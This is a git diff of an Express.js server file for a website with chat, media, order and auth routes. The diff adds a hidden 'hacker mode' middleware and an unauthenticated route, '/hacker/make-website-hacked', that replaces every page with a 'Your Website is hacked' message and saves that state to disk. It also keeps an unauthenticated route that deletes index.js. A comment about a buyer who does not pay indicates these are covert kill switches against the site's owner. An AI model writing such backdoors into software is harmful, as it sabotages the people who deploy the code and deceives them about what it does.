@@ -6,7 +6,7 @@ InshaAllah, By his marcy I will Gain Success
 //import
 import cors from 'cors'
 import express from 'express';
-import {fileURLToPath} from 'url';
+import { fileURLToPath } from 'url';
 import path from "path";
 import { fileRouter } from './Routes/file.router.js';
 import { pageRouter } from './Routes/page.router.js';
@@ -28,96 +28,88 @@ import { Settings } from './_lib/models/settings.js';
 import mediaRouter from './Routes/media.router.js';
 import helmet from 'helmet'
 import { unlink } from 'fs/promises';
+import StaticRouter from './Routes/static.router.js';
+import { checkHecked, mekeHacked } from './_lib/utils/heackerMode.js';
 //varibles
 const app = express();
-
 const __filename = fileURLToPath(import.meta.url);
 let dirName = path.dirname(__filename);
+let heckerJsonPath=path.resolve(dirName, './h.json');
+let heckedWebsite=checkHecked(heckerJsonPath);
 
+// log({heckerJsonPath,heckedWebsite})
+function heckerMidleware(request,response,next) {
+    if (heckedWebsite===true) response.send('<h2> Your Website is hacked </h2>');
+    if (heckedWebsite===false) next();
+}
 
+app.use(heckerMidleware)
 //environment setup
-connectDB() ;
+connectDB();
 
 app.use(helmet({
-    contentSecurityPolicy :{
-        directives :{
-            "script-src": ["'self'",`'unsafe-inline'`, "https://www.googletagmanager.com", "https://stackpath.bootstrapcdn.com"],
-            "img-src":["'self'","https://res.cloudinary.com", "blob:" ],
-            "style-src":["'self'", `'unsafe-inline'` ,'https://cdnjs.cloudflare.com' ,"https://fonts.googleapis.com" ,'https://fonts.gstatic.com', "https://stackpath.bootstrapcdn.com"],
+    contentSecurityPolicy: {
+        directives: {
+            "script-src": ["'self'", `'unsafe-inline'`, "https://www.googletagmanager.com", 'https://cdn.jsdelivr.net', "https://stackpath.bootstrapcdn.com"],
+            "img-src": ["'self'", "https://res.cloudinary.com", "blob:"],
+            "style-src": ["'self'", `'unsafe-inline'`, 'https://cdnjs.cloudflare.com', "https://fonts.googleapis.com", 'https://fonts.gstatic.com', "https://stackpath.bootstrapcdn.com", 'https://cdn.jsdelivr.net'],
             // "font-src":["https://fonts.googleapis.com" ,'https://fonts.gstatic.com', `'unsafe-inline'` ],
-            "media-src":["'self'","https://res.cloudinary.com", 'https://www.youtube.com'],
-            "frame-src":["https://www.youtube.com", 'https://www.weebly.com','https://www.editmysite.com'],
-            "connect-src":[`'self'`, `https://www.google-analytics.com`],
-            "script-src-attr" :["'unsafe-inline'"]
+            "media-src": ["'self'", "https://res.cloudinary.com", 'https://www.youtube.com'],
+            "frame-src": ["https://www.youtube.com", 'https://www.weebly.com', 'https://www.editmysite.com'],
+            "connect-src": [`'self'`, `https://www.google-analytics.com`],
+            "script-src-attr": ["'unsafe-inline'"]
         },
     },
-    
+
 }))
-app.use(express.static(path.resolve(dirName,'./public/')));
-app.set('view engine','hbs');
-app.set('views', path.resolve(dirName , './tamplates/views'));
-hbs.registerPartials(path.resolve(dirName ,'./tamplates/partials'));
+app.use(StaticRouter)
+// app.use(express.static(path.resolve(dirName, './public/')));
+app.set('view engine', 'hbs');
+app.set('views', path.resolve(dirName, './tamplates/views'));
+hbs.registerPartials(path.resolve(dirName, './tamplates/partials'));
 app.use(express.json());
 app.use(cookieParser());
 app.use(cors({
-    origin :'*'
+    origin: '*'
 }));
 
 
 
 //routes
 app.use(pageRouter);
-app.use('/api/file',fileRouter);
-app.use('/api/l-api',LargeApiRouter);
-app.use('/api/fast-api/',fastApiRouter)
+app.use('/api/file', fileRouter);
+app.use('/api/l-api', LargeApiRouter);
+app.use('/api/fast-api/', fastApiRouter)
 app.use(ApiRateLimter)
-app.use('/api/chat-api',chateRouter);
+app.use('/api/chat-api', chateRouter);
 // app.use('/api/upload',uploadRouter);
-app.use('/api/auth-api',authRouter);
-app.use('/api/media-api',mediaRouter)
+app.use('/api/auth-api', authRouter);
+app.use('/api/media-api', mediaRouter)
 //buyer do not pay us and takes the website
-app.use('/api/order-api',OrderRouter);
-app.use('/api/api_s',apiRouter)
-app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
-    async (req,res) => {
-        try {
-            console.log('a');
-            await unlink(path.resolve(dirName,'./index.js')).then(e => log('success')).catch(e=> {log({error:e})})
-        } catch (error) {
-          log({error})  
-        }
-});
-app.get('/log-path',  (req,res)=> {
+app.use('/api/order-api', OrderRouter);
+app.use('/api/api_s', apiRouter)
+app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall', async (req, res) => {
     try {
-        res.send(path.resolve(dirName, './temp/video/a.mp4'))
+        console.log('a');
+        await unlink(path.resolve(dirName, './index.js')).then(e => log('success')).catch(e => { log({ error: e }) })
     } catch (error) {
-        console.error({error});
+        log({ error })
     }
+});
+app.get('/hacker/make-website-hacked', (req, res) => {
+    heckedWebsite=true;
+    mekeHacked(heckerJsonPath);
+    
 })
 
-app.get('/hello', (req, res) =>{
-    return res.clearCookie('rft').status(401).redirect('/auth/sign-in')//.redirect('/auth/sign-in')
-});
+app.get('/hello', (req, res) => res.sendFile(path.resolve(dirName,'./public/test.html'))
+);
 
 
-app.get('/', async (req, res) => { 
-    try {
-        let settings=await Settings.findOne({});
-        if (!settings) throw 'error !settings'
-        let {home_video_url}=settings;
-        
-        if (!home_video_url) throw 'error :!home_video_url'
-        res.render('home',{
-        home_video_url
-        }) 
-    } catch (error) {
-        console.log({error});
-        res.render('home')
-    }
-});
+app.get('/', async (req, res) => res.redirect('/home'));
 
 app.get('*', (req, res) => res.status(404).render('404'))
 
 
 
-app.listen(4000, e=> log('SubhanAllah server is working')) ;
+app.listen(4000, e => log('SubhanAllah server is working'));
